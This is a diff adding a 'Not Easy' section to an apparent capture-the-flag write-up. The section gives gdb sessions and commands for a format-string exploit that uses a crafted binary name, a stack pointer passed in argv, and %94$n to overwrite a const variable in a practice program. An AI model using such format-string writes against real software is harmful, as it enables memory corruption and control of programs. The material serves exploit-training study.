@@ -128,3 +128,81 @@ $1 = 201527
 >>> env -i $'./%0201525p%97$n---------------------' $'\x04\xed\xff\xff\xff\x7f' '' 'b'
 000<... shitload of 0s>00007fffffffee18---------------------you win!
 ```
+
+
+### Not Easy
+```
+>>> gcc -o '%p-%p-%p-%p-%p-%p-%p-%p' -g game.c
+>>> gdb --args env -i ./%p-%p-%p-%p-%p-%p-%p-%p $'\x34\x12\xff\xff\xff\x7f' '' 'b'
+(gdb) start
+(gdb) x/1xg argv[1]
+0x7fffffffefd4: 0x00007fffffff1234
+// My pointer is not aligned correctly, needs to be +- 4 bytes
+(gdb) q
+
+>>> gdb --args env -i ./%p-%p-%p-%p-%p-%p-%p-%p $'\x34\x12\xff\xff\xff\x7f' '' 'bcdef'
+(gdb) start
+(gdb) x/1xg argv[1]
+0x7fffffffefd0: 0x00007fffffff1234
+// Now correctly aligned
+(gdb) p &i
+$1 = (const int *) 0x7fffffffed24
+// Address of `i` to now pass in as an argument
+(gdb) q
+
+>>> gdb --args env -i ./%p-%p-%p-%p-%p-%p-%p-%p $'\x24\xed\xff\xff\xff\x7f' '' 'bcdef'
+(gdb) start
+(gdb) x/1xg argv[1]
+0x7fffffffefd0: 0x00007fffffffed24
+// Pointer to `i`, stored at 0x7fffffffefd0
+
+(gdb) n
+7           const int i = 0;
+(gdb) n
+8           uint8_t j = 128;
+(gdb) n
+12          uint8_t l = 255;
+(gdb) n
+14          printf(argv[0]);
+(gdb) p $rsp+8
+$1 = (void *) 0x7fffffffed10
+(gdb) x/6xg 0x7fffffffed10
+0x7fffffffed10: 0x00007fffffffee28      0x0000000455555080
+0x7fffffffed20: 0x00000000ff80ee20      0x0000555555556004
+0x7fffffffed30: 0x0000000000000000      0x00007ffff7dda083
+// When at first instruction of printf() the SP is pointing to one 8-byte block past first stack argument
+// This shows us the address of the first 6th printf argument `0x7fffffffed10`
+(gdb) q
+
+// Calculate the parameter offset between the 6th argument and our malicious pointer
+>>> python3
+>>> (0x7fffffffefd0 - 0x7fffffffed10) / 8 + 6
+94.0
+>>> exit()
+// Our pointer is the 94th argument to printf
+
+// Recompile executable with new name to overwrite 94th param to printf
+>>> gcc -o $'%0201525p%94$n---------' -g game.c
+>>> gdb --args env -i $'./%0201525p%94$n---------' $'\x24\xed\xff\xff\
+xff\x7f' '' 'bcdef'
+(gdb) n
+7           const int i = 0;
+(gdb) n
+8           uint8_t j = 128;
+(gdb) n
+12          uint8_t l = 255;
+(gdb) n
+14          printf(argv[0]);
+(gdb) p i
+$1 = 0
+(gdb) n
+<shitload of 0s>
+(gdb) p i
+$2 = 201527
+(gdb) n
+17              printf("you win!\n");
+(gdb) q
+
+>>> env -i $'./%0201525p%94$n---------' $'\x24\xed\xff\xff\xff\x7f' '' 'bcdef'
+00<many many 0s>007fffffffee28---------you win!
+```
